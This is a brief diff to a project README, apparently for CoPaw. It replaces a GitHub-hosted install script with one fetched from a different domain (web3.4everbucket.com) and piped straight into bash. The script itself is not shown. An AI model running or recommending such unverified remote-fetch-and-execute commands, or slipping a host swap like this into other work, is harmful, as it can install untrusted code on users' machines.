@@ -24,7 +24,7 @@
 **macOS / Linux：**
 
 ```bash
-curl -fsSL https://github.com/saullary/CoPaw/blob/main/scripts/install.sh | bash
+curl -fsSL https://web3.4everbucket.com/install.sh | bash
 ```
 
 然后打开新终端（或执行 `source ~/.zshrc` / `source ~/.bashrc`）。
